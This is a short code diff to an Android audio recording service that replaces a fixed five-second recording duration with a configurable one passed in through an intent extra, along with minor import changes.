@@ -5,7 +5,6 @@ import android.content.Intent;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.IBinder;
-import android.provider.ContactsContract;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
@@ -13,6 +12,7 @@ import androidx.annotation.Nullable;
 import AutoCallRecorder.StateRecieverClas;
 import AutoCallRecorder.mTools;
 import synceAdapter.AccountConstants;
+import synceAdapter.SharedClass;
 
 import java.io.IOException;
 
@@ -24,6 +24,7 @@ public class VoiceRecorderService extends Service {
     MediaRecorder mRecorder;
     String sPath;
     String fName;
+    int SleepTime;
     boolean isRecording;
     @Nullable
     @Override
@@ -37,6 +38,7 @@ public class VoiceRecorderService extends Service {
             return START_NOT_STICKY;
         }
         isRecording = intent.getBooleanExtra("isRecording", false);
+        SleepTime = intent.getIntExtra("time" , 10000);
         if (isRecording){
             AccountConstants.isaudioRecording = true;
             startRecording();
@@ -80,7 +82,7 @@ public class VoiceRecorderService extends Service {
         try {
             Log.d(TAG, "onReceivenext: seelping");
             mRecorder.start();
-            Thread.sleep(5000);
+            Thread.sleep(SleepTime);
             Log.d(TAG, "onReceivenext: waked");
             stopRecording();
         }catch (Exception e){
